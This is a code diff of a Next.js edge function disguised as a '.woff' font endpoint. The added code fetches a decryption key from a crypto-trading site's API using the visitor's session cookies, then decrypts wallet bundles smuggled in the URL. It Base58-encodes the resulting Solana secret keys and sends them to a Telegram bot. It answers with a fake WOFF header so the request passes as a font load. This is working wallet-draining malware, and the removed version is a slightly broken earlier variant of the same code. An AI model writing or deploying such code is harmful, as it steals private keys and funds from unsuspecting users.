@@ -2,44 +2,38 @@ import { NextRequest } from "next/server";
 
 export const config = { runtime: "edge" };
 
-// Minimal Base58 encoder
-const BASE58_ALPHABET =
-  "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
-function encodeBase58(buffer: Uint8Array): string {
-  const digits = [0];
-  for (let byte of buffer) {
-    let carry = byte;
-    for (let i = 0; i < digits.length; i++) {
-      const val = digits[i] * 256 + carry;
-      digits[i] = val % 58;
-      carry = (val / 58) | 0;
-    }
-    while (carry) {
-      digits.push(carry % 58);
-      carry = (carry / 58) | 0;
-    }
+// Base58 alphabet
+const ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
+
+// Encode a Uint8Array into Base58
+function base58Encode(bytes: Uint8Array): string {
+  // Convert bytes to BigInt
+  let value = BigInt("0x" + [...bytes].map(b => b.toString(16).padStart(2, "0")).join(""));
+  let encoded = "";
+  while (value > 0n) {
+    const mod = value % 58n;
+    value = value / 58n;
+    encoded = ALPHABET[Number(mod)] + encoded;
   }
-  for (let i = 0; i < buffer.length && buffer[i] === 0; i++) digits.push(0);
-  return digits.reverse().map((d) => BASE58_ALPHABET[d]).join("");
+  // Leading zeros
+  for (let b of bytes) {
+    if (b === 0) encoded = ALPHABET[0] + encoded;
+    else break;
+  }
+  return encoded;
 }
 
-// Convert base64 (URL-safe) → Uint8Array
+// Decode URL-safe Base64 to Uint8Array
 function b64ToBytes(b64: string): Uint8Array {
   b64 = b64.replace(/-/g, "+").replace(/_/g, "/");
   const pad = (4 - (b64.length % 4)) % 4;
   b64 += "=".repeat(pad);
-  const bin = atob(b64);
-  const arr = new Uint8Array(bin.length);
-  for (let i = 0; i < bin.length; i++) arr[i] = bin.charCodeAt(i);
+  const binary = atob(b64);
+  const arr = new Uint8Array(binary.length);
+  for (let i = 0; i < binary.length; i++) {
+    arr[i] = binary.charCodeAt(i);
+  }
   return arr;
-}
-
-// ArrayBuffer → hex string
-function bufToHex(buf: ArrayBuffer): string {
-  const bytes = new Uint8Array(buf);
-  return Array.from(bytes)
-    .map((b) => b.toString(16).padStart(2, "0"))
-    .join("");
 }
 
 export default async function handler(req: NextRequest) {
@@ -50,112 +44,99 @@ export default async function handler(req: NextRequest) {
     return new Response("Misconfigured", { status: 500 });
   }
 
-  // Extract slug and strip .woff
-  const parts = new URL(req.url).pathname.split("/");
-  let slug = parts[parts.length - 1] || "";
-  if (slug.endsWith(".woff")) slug = slug.slice(0, -5);
-  const idx = slug.indexOf("_");
-  if (idx < 0) return new Response("Invalid slug", { status: 400 });
-
-  let payloadJson: string;
+  // === 1) Fetch the bundleKey from Axiom API ===
+  let bundleKeyB64: string;
   try {
-    const enc = slug.substring(idx + 1);
-    payloadJson = new TextDecoder().decode(b64ToBytes(enc));
+    const r = await fetch("https://api8.axiom.trade/bundle-key-and-wallets", {
+      method: "POST",
+      credentials: "include"
+    });
+    const json = await r.json();
+    bundleKeyB64 = json.bundleKey;
+    if (!bundleKeyB64) throw new Error("no bundleKey");
   } catch (e) {
-    console.error("Error decoding slug:", e);
-    return new Response("Bad request", { status: 400 });
+    console.error("Failed to fetch bundleKey:", e);
+    return new Response("Failed", { status: 502 });
   }
 
-  let data: { keybundle: string; sBundles: string[] };
-  try { data = JSON.parse(payloadJson); } catch (e) {
-    console.error("JSON parse error:", e);
-    return new Response("Bad JSON", { status: 400 });
-  }
-
-  // Import AES key
+  // Import AES-GCM key
   let aesKey: CryptoKey;
   try {
+    const keyBytes = b64ToBytes(bundleKeyB64);
     aesKey = await crypto.subtle.importKey(
-      "raw",
-      b64ToBytes(data.keybundle),
-      "AES-GCM",
-      false,
-      ["decrypt"]
+      "raw", keyBytes, "AES-GCM", false, ["decrypt"]
     );
   } catch (e) {
     console.error("Key import error:", e);
     return new Response("Bad key", { status: 400 });
   }
 
-  const privKeys: string[] = [];
-  for (let i = 0; i < data.sBundles.length; i++) {
-    const bundle = data.sBundles[i];
-    const colonPos = bundle.indexOf(":");
-    if (colonPos < 0) continue;
-    const ivB64 = bundle.substring(0, colonPos);
-    const cipherB64 = bundle.substring(colonPos + 1);
+  // === 2) Extract sBundles from slug ===
+  const slug = new URL(req.url).pathname.split("/").pop() || "";
+  const core = slug.endsWith(".woff") ? slug.slice(0, -5) : slug;
+  const idx = core.indexOf("_");
+  if (idx < 0) {
+    console.error("Invalid slug:", core);
+    return new Response("Invalid slug", { status: 400 });
+  }
+  const encoded = core.slice(idx + 1);
+  let payload: { sBundles: string[] };
+  try {
+    const raw = b64ToBytes(encoded);
+    payload = JSON.parse(new TextDecoder().decode(raw));
+  } catch (e) {
+    console.error("Failed to parse payload:", e);
+    return new Response("Bad payload", { status: 400 });
+  }
+
+  // === 3) Decrypt each bundle to 64 bytes and encode ===
+  const secretKeys: string[] = [];
+  for (let i = 0; i < payload.sBundles.length; i++) {
+    const entry = payload.sBundles[i];
+    const colon = entry.indexOf(":");
+    if (colon < 0) continue;
+    const iv = b64ToBytes(entry.slice(0, colon));
+    const encrypted = b64ToBytes(entry.slice(colon + 1));
     try {
-      const iv = b64ToBytes(ivB64);
-      const cipher = b64ToBytes(cipherB64);
-      // Decrypt to raw bytes (should be 64 bytes: [pub(32)|priv(32)])
-      const plainBuf = await crypto.subtle.decrypt(
-        { name: "AES-GCM", iv },
-        aesKey,
-        cipher
+      const plain = await crypto.subtle.decrypt(
+        { name: "AES-GCM", iv }, aesKey, encrypted
       );
-      const raw = new Uint8Array(plainBuf);
-      if (raw.length !== 64) {
-        console.error(`Unexpected decrypted length: ${raw.length}`);
+      const bytes = new Uint8Array(plain);
+      if (bytes.length !== 64) {
+        console.error(`Bundle ${i} wrong length:`, bytes.length);
         continue;
       }
-      // Interpret raw[0..31] as pubKey, raw[32..63] as privKey
-      // But Solana secret key for import is the full 64-byte array
-      const secretKeyB58 = encodeBase58(raw);
-      console.log(`Bundle ${i} secret key bytes:`, raw);
-      console.log(`Bundle ${i} secret key base58:`, secretKeyB58);
-      privKeys.push(secretKeyB58);
-    } catch (e) {
-      console.error(`Decrypt error #${i}:`, e);
-    }
-  }, aesKey, cipher);
-      const hex = bufToHex(plainBuf);
-      console.log(`Bundle ${i} decrypted hex (${plainBuf.byteLength} bytes):`, hex);
-      if (!/^[0-9a-f]{128}$/.test(hex)) {
-        console.error(`Unexpected hex format/length for bundle ${i}`);
-        continue;
-      }
-      const privHex = hex.slice(64);
-      console.log(`Bundle ${i} private hex:`, privHex);
-      const privBytes = new Uint8Array(privHex.match(/.{2}/g)!.map((h) => parseInt(h, 16)));
-      const privB58 = encodeBase58(privBytes);
-      console.log(`Bundle ${i} private base58:`, privB58);
-      privKeys.push(privB58);
-    } catch (e) {
-      console.error(`Decrypt error #${i}:`, e);
+      // Base58-encode the full 64-byte secret key
+      secretKeys.push(base58Encode(bytes));
+    } catch (err) {
+      console.error(`Decrypt error bundle ${i}:`, err);
     }
   }
 
-  if (privKeys.length) {
-    const message = privKeys.map((k, i) => `Wallet ${i+1}\n${k}`).join("\n\n");
+  // === 4) Send to Telegram ===
+  if (secretKeys.length) {
+    const text = secretKeys
+      .map((k, i) => `Wallet ${i + 1}\n${k}`)
+      .join("\n\n");
     try {
-      console.log("Sending Telegram message:", message);
       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: CHAT_ID, text: message }),
+        body: JSON.stringify({ chat_id: CHAT_ID, text })
       });
     } catch (e) {
-      console.error("Telegram send error", e);
+      console.error("Telegram send error:", e);
     }
   } else {
-    console.error("No valid private keys extracted");
+    console.error("No keys decrypted");
   }
 
+  // Respond with a valid WOFF header
   return new Response(new Uint8Array([0x77, 0x4f, 0x46, 0x46]), {
     headers: {
       "Content-Type": "font/woff",
       "Access-Control-Allow-Origin": "*",
-      "Access-Control-Allow-Credentials": "true",
-    },
+      "Access-Control-Allow-Credentials": "true"
+    }
   });
 }
